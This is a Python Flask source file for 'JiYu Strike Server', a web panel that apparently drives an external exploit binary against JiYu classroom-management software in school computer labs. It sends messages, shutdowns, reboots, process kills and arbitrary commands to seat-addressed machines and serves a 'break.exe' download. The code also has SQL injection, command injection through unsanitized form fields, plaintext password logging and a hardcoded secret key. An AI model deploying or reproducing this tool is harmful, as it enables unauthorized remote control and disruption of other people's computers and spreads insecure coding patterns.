import os
import re

from flask import Flask, request, render_template, session, redirect, url_for, send_from_directory
import sqlite3
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'yinb666yyds@@##'

ver = "1.3 BETA"
allMessage = 'NULL'
serverStatus = 'success'
member = 0
syson = 'false'


@app.errorhandler(404)
def page_not_found(e):
    return render_template('error.html', title="No Found", error="404 No Found", shuoming="请求的目录没有找到", ver=ver), 404


@app.errorhandler(500)
def internal_Server_error(e):
    return render_template('error.html', title="Internal Server Error", error="500 Internal Server Error",
                           shuoming="服务器无法处理请求", ver=ver), 500


@app.errorhandler(400)
def bad_requests(e):
    return render_template('error.html', title="Bad Requests", error="400 Bad Requests", shuoming="请求出现错误",
                           ver=ver), 500


@app.errorhandler(405)
def method_not_allowed(e):
    return render_template('error.html', title="Method Not Allowed", error="405 Method Not Allowed", shuoming="不被允许的请求",
                           ver=ver), 500


config = {
    'NAME': 'NULL',
    'ROOM': 'NULL',
    'IP': 'NULL',
    'ALLOW': 'NULL',
    'IPKEY': 'NULL',
}


def loadinfo(name):
    try:
        conn = sqlite3.connect('config.db')
        print("数据库连接成功!")
        c = conn.cursor()
        cursor = c.execute(f"SELECT NAME, ROOM, IP, ALLOW , IPKEY from INFO where NAME='{name}'")
        for row in cursor:
            config['NAME'] = row[0]
            config['ROOM'] = row[1]
            config['IP'] = row[2]
            config['ALLOW'] = row[3]
            config['IPKEY'] = row[4]
        print("配置文件载入成功！")
        conn.close()
    except:
        print('数据库出现错误！！！')


@app.route('/')
def index():
    if 'username' not in session:
        return redirect(url_for('login'))
    ip = request.remote_addr
    location = iptol(ip, 'ip-id')
    return render_template('index.html', room=config['ROOM'],
                           member=str(member) + '人', ipnow=ip, ver=ver,
                           user=session['username'], power='权限:' + str(session['power']),
                           location=location, serverStatus=serverStatus,
                           allmessage=allMessage)


@app.route('/break')
def breakapp():
    if 'username' not in session:
        return redirect(url_for('login'))
    ip = request.remote_addr
    t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    print(f'#### {t}  用户:' + session['username'] + f' IP:{ip} 下载Trainer ####')
    return render_template('break.html')


@app.route("/download")
def download():
    if 'username' not in session:
        return redirect(url_for('login'))
    return send_from_directory("", '', filename='break.exe', as_attachment=True)


@app.route('/login', methods=['GET', 'POST'])
def login():
    global member
    t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    ip = request.remote_addr
    location = iptol(ip, 'ip-id')
    if request.method == 'GET':
        return render_template('login.html', pwd=0, location=location)
    else:
        pwd = request.form['pwd']
        usr = request.form['usr']
        if pwd != '' and usr != '':
            sqli = re.compile(r"^[A-Za-z0-9]+$")
            usr_code = sqli.findall(usr)[0]
            if usr_code != usr:
                return render_template('login.html', pwd=1, info="用户名格式不正确！", location=location)
            usrinfo = verify(usr, pwd)
            f = open("log/system.log", "a")
            f.write(f'{t}   <{usr} | {pwd}>  TRY LOGIN {usrinfo} IP:{ip} \n')
            f.close()
            if usrinfo['status'] == 'NO USER':
                return render_template('login.html', pwd=1, info="用户不存在！", location=location)
            elif usrinfo['status'] == 'WRONG PASSWD':
                return render_template('login.html', pwd=1, info="密码错误", location=location)
            elif usrinfo['status'] == 'SUCCESS':
                if usrinfo['power'] == 0:
                    return render_template('info.html', info="账号已经停用！")
                print(f'#### {t}  用户{usr}  IP:{ip} 登录成功 ####')
                member += 1
                session['username'] = usr
                session['power'] = usrinfo['power']
                f = open("log/user.log", "a")
                f.write(f'{t}   [{usr}]  USER LOGIN IP:{ip} \n')
                f.close()
                return redirect(url_for('index'))
            else:
                return render_template('error.html', title="Server Error", error="服务器错误", shuoming="服务器处理请求出现错误",
                                       ver=ver)
        else:
            return render_template('login.html', pwd=1, info="用户名密码不能为空！", location=location)


def iptol(data, mode):
    if mode == 'id-ip':
        location_r = data[0:1]
        location_c = data[1:]
        if location_c == '10':
            location_r = int(location_r) + 1
            location_c = '0'
        return config['IP'] + config['IPKEY'] + str(location_r) + location_c

    elif mode == 'ip-id':
        room = config['ROOM']
        chair = data.replace(config['IP'] + config['IPKEY'], '')
        location_r = chair[0:1]
        location_c = chair[1:]
        if location_c == '0':
            location_r = int(location_r) - 1
            location_c = '10'
        return '当前位置:' + room + '机房' + ' ' + str(location_r) + '排' + location_c + '号'


@app.route('/forget_passwd', methods=['GET', 'POST'])
def forget_passwd():  # put application's code here
    if request.method == 'GET':
        return render_template('info.html', info="密码忘了你还理直气壮的来？ 你在狗叫什么？")
    else:
        return render_template('info.html', info="密码忘了你还理直气壮的来？ 你在狗叫什么？")
        # answer = request.form['answer']
        # if answer == user_config['ANSWER']:
        #     session['reset'] = user_config['ANSWER']
        #     return render_template('reset_user.html')
        # else:
        #     return render_template('forget.html', pwd=1, QUESTION=user_config['QUESTION'])


def verify(username, password):
    conn = sqlite3.connect('config.db')
    c = conn.cursor()
    cursor = c.execute(f"SELECT USERNAME, PASSWD, QUESTION, ANSWER, POWER  from USER Where username='{username}'")
    usrinfo = {'status': 'NULL', 'power': 'NULL'}
    usr = 0
    for row in cursor:
        usr = row[0]
        pwd = row[1]
        q = row[2]
        a = row[3]
        usrinfo['power'] = row[4]
    conn.close()
    if usr == 0:
        usrinfo['status'] = 'NO USER'
        return usrinfo
    else:
        if pwd == password:
            usrinfo['status'] = 'SUCCESS'
        else:
            usrinfo['status'] = 'WRONG PASSWD'
        return usrinfo


def command(ip, data, typ):
    if typ == 'msg':
        shell = f'shell.exe -i {ip} -msg "{data}"'
    elif typ == 'cmd':
        shell = f'shell.exe -i {ip} -c "{data}"'
    t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    ip = request.remote_addr
    f = open("log/shell.log", "a")
    usr = session['username']
    f.write(f'{t}  [{usr}] EXPLOIT {shell} IP:{ip} \n')
    f.close()
    src = os.popen(shell)
    src = src.readlines()
    src = src[0]
    src = str(src)
    if '发送成功' in src:
        return "SUCCESS"
    else:
        return "ERROR"


@app.route('/control', methods=['GET', 'POST'])
def control1():  # put application's code here
    if 'username' not in session:
        return redirect(url_for('login'))
    if serverStatus != 'success':
        return redirect(url_for('weihu'))
    ip = request.remote_addr
    if request.method == 'GET':
        if syson == 'true':
            enable = '请输入发送的信息'
        else:
            enable = '功能已禁用，请使用cmd消息 disabled'
        return render_template('msg.html', room=config['ROOM'],
                               member='8人', ipnow=ip, ver=ver,
                               user=session['username'], power='权限:' + str(session['power']),
                               on=enable)
    else:
        row = request.form['row_value']
        column = request.form['column_value']
        msg = request.form['msg']
        msg_ip = iptol(row + column, 'id-ip')
        command(msg_ip, msg, 'msg')
        t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        print(f'#### {t}  用户' + session['username'] + f' IP:{ip} 对{msg_ip}发送信息 "{msg}" ####')
        return '成功'


@app.route('/sys', methods=['GET', 'POST'])
def control2():  # put application's code here
    if 'username' not in session:
        return redirect(url_for('login'))
    if serverStatus != 'success':
        return redirect(url_for('weihu'))
    ip = request.remote_addr
    if request.method == 'GET':
        return render_template('sys.html', room=config['ROOM'],
                               member='8人', ipnow=ip, ver=ver,
                               user=session['username'], power='权限:' + str(session['power']))
    else:
        row = request.form['row']
        column = request.form['column']
        scmd = request.form['cmd']
        if scmd == 'shutdown':
            if request.form['msg'] == '':
                smsg = ''
            else:
                smsg = ' -c ' + '"' + request.form['msg'] + '"'
            if request.form['time'] == '':
                stime = '0'
            else:
                stime = request.form['time']
            scom = 'shutdown -s -t ' + stime + smsg
        elif scmd == 'cancelShutdown':
            scom = 'shutdown -a'
        elif scmd == 'reboot':
            scom = 'shutdown -r'
        elif scmd == 'lock':
            scom = 'shutdown -l'
        msg_ip = iptol(row + column, 'id-ip')
        t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        print(f'#### {t}  用户' + session['username'] + f' IP:{ip} 对{msg_ip}发送指令 {scom} ####')
        command(msg_ip, scom, 'cmd')
        return '成功'


@app.route('/cmd', methods=['GET', 'POST'])
def control3():  # put application's code here
    if 'username' not in session:
        return redirect(url_for('login'))
    if serverStatus != 'success':
        return redirect(url_for('weihu'))
    ip = request.remote_addr
    if request.method == 'GET':
        return render_template('cmd.html', room=config['ROOM'],
                               member='8人', ipnow=ip, ver=ver,
                               user=session['username'], power='权限:' + str(session['power']))
    else:
        row = request.form['row']
        column = request.form['column']
        if request.form['mode'] == 'cmdmsg':
            ci = request.form['ci']
            msg = request.form['msg']
            sc = f'color 0a&echo {msg}&pause'

        elif request.form['mode'] == 'cmd':
            payload = request.form['payload']
            if payload == 'calc':
                sc = 'calc'
            elif payload == 'notepad':
                sc = 'notepad'
            elif payload == 'killexp':
                sc = 'taskkill /F /IM explorer.exe'
            elif payload == 'runexp':
                sc = 'start C:\Windows\explorer.exe'
            elif payload == 'taskkill':
                task = request.form['task']
                sc = f'taskkill /F /IM {task}'
            elif payload == 'start':
                task = request.form['task']
                sc = f'start {task}'
        msg_ip = iptol(row + column, 'id-ip')
        command(msg_ip, sc, 'cmd')
        return '成功'


@app.route('/setting', methods=['GET', 'POST'])
def setting():
    if 'username' not in session:
        return redirect(url_for('login'))
    ip = request.remote_addr
    if request.method == 'GET':
        if int(session['power']) < 2:
            return render_template('info.html', info='权限不足!')
        else:
            if syson == 'true':
                jymsg = 1
            else:
                jymsg = 0
            return render_template('setting.html', room=config['ROOM'],
                                   member=str(member) + '人', ipnow=ip, ver=ver,
                                   user=session['username'], power='权限:' + str(session['power'])
                                   , jymsg=jymsg)
    else:
        global allMessage
        allMessage = request.form['allmsg']

        return '成功'


@app.route('/setting/apiset', methods=['POST'])
def apiset():
    global syson, serverStatus
    if 'username' not in session:
        return redirect(url_for('login'))
    setClass = request.form['setClass']
    if setClass == 'jymsg':
        syson = request.form['value']
    elif setClass == 'sers':
        serverStatus = request.form['value']
    return '成功'


@app.route('/admin', methods=['GET', 'POST'])
def selfkill():
    ip = request.remote_addr
    command(ip, 'shutdown -s -t 5', 'cmd')
    t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    print(f'#### {t}  用户' + session['username'] + f' IP:{ip} 自己关闭了自己的电脑 ####')
    return render_template('info.html', info='自杀关机成功！')


@app.route('/Service', methods=['GET', 'POST'])
def weihu():
    ip = request.remote_addr
    location = iptol(ip, 'ip-id')
    return render_template('stop.html', info="服务端连接失败！多试几次吧", location=location)


@app.route('/file', methods=['GET', 'POST'])
def file():
    return render_template('info.html', info="文件列表暂无文件", )


@app.route('/group', methods=['GET', 'POST'])
def group():
    if 'username' not in session:
        return redirect(url_for('login'))
    if serverStatus != 'success':
        return redirect(url_for('weihu'))
    ip = request.remote_addr
    if request.method == 'GET':
        if int(session['power']) < 2:
            return render_template('info.html', info='权限不足!')
        else:
            return render_template('group.html', user=session['username'],
                                   power='权限:' + str(session['power']))
    else:
        row1 = request.form['row1']
        column1 = request.form['column1']
        row2 = request.form['row2']
        column2 = request.form['column2']
        cmd = request.form['cmd']
        location_r = row1
        location_c = column1
        location_r2 = row2
        location_c2 = column2
        if location_c == '10':
            location_r = int(location_r) + 1
            location_c = '0'
        if location_c2 == '10':
            location_r2 = int(location_r2) + 1
            location_c2 = '0'
        ipd = config['IP'] + config['IPKEY'] + str(location_r) + location_c + '-' + config['IPKEY'][1:] + str(location_r2) + location_c2
        command(ipd, cmd, 'cmd')
        return '成功'


@app.route('/clear_login', methods=['GET'])
def clear():  # put application's code here
    session.clear()
    return redirect(url_for('login'))


def choice():
    print('请选择加载的机房信息    现有配置文件： 1.613机房  2.615机房  3.测试')
    num = input("请输入配置文件编号:")
    conf = '615机房'
    if num == '1':
        conf = '613机房'
    elif num == '2':
        conf = '615机房'
    elif num == '3':
        conf = '测试'
    else:
        print('输入错误,将加载默认机房')
    print(f'正在载入配置文件: {conf} ...')
    loadinfo(conf)


if __name__ == '__main__':
    info = '''      _ _______     ___    _    _____ _______ _____  _____ _  ________ 
     | |_   _\ \   / / |  | |  / ____|__   __|  __ \|_   _| |/ /  ____|
     | | | |  \ \_/ /| |  | | | (___    | |  | |__) | | | | ' /| |__   
 _   | | | |   \   / | |  | |  \___ \   | |  |  _  /  | | |  < |  __|  
| |__| |_| |_   | |  | |__| |  ____) |  | |  | | \ \ _| |_| . \| |____ 
 \____/|_____|  |_|   \____/  |_____/   |_|  |_|  \_\_____|_|\_\______|'''

    print(info)
    print('=======================================================================')
    print(f' JiYu Strike Server   Author:Yi      VER:张衡楼 {ver}         Debug:OFF')
    print('=======================================================================')
    choice()
    print('正在启动服务...')
    app.run(host='0.0.0.0', port=80)
